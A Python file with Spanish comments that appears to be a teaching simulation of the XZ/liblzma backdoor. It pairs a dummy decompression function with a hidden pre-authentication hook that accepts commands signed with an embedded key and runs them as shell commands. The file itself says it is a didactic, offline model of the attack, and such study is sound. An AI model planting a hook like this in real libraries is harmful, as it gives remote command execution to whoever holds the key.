"""Stand-in de liblzma: una librería de 'compresión' que el daemon importa.

El punto del caso XZ (CVE-2024-3094): el código malicioso NO vive en sshd, vive
acá, en una dependencia transitiva. El daemon nunca supo que esta función estaba
hookeada.

SIMULACIÓN DIDÁCTICA — no es el binario real de XZ. El real hookea
RSA_public_decrypt vía IFUNC y verifica una firma ED448 del atacante. Acá el
MECANISMO es el mismo (keyed, pre-auth, RCE) con HMAC de la stdlib en lugar de
ED448, para que sea reproducible y 100% offline.
"""
import hmac
import hashlib
import subprocess

# "Clave del atacante" incrustada en la librería. Sólo quien la tiene puede forjar
# un payload válido → por eso XZ no se explotó masivamente: únicamente el dueño de
# la clave podía disparar el backdoor. (En el real es una clave pública ED448; acá
# HMAC simétrico por simplicidad.)
ATTACKER_KEY = b"xz-backdoor-attacker-ed448-stand-in"
MAGIC = b"\xff\x4b\x07\x00"  # prefijo oculto en el "certificado" del cliente


def decompress(data: bytes) -> bytes:
    """La función legítima y aburrida que todos creen que es lo único que hace."""
    return data  # de juguete


def _valid(cmd: bytes, sig: bytes) -> bool:
    expected = hmac.new(ATTACKER_KEY, cmd, hashlib.sha256).digest()
    return hmac.compare_digest(expected, sig)


def pre_auth_hook(packet: bytes):
    """Hook escondido. El daemon lo llama con los bytes crudos del cliente ANTES de
    autenticar (como el RSA_public_decrypt hookeado del XZ real). Si el payload trae
    el prefijo mágico y una firma válida del atacante, ejecuta el comando y devuelve
    la salida. Si no, devuelve None y el login sigue su curso normal.
    """
    if not packet.startswith(MAGIC):
        return None
    body = packet[len(MAGIC):]
    try:
        cmd, sig = body.rsplit(b"||", 1)
    except ValueError:
        return None
    if not _valid(cmd, sig):
        return None  # firma inválida: no sos el atacante
    # RCE pre-auth con los privilegios del daemon (en el container corre como root).
    # shell=True porque el backdoor real ejecuta vía system(): comando de shell crudo.
    out = subprocess.run(cmd.decode(), shell=True, capture_output=True, text=True)
    return (out.stdout + out.stderr).encode()
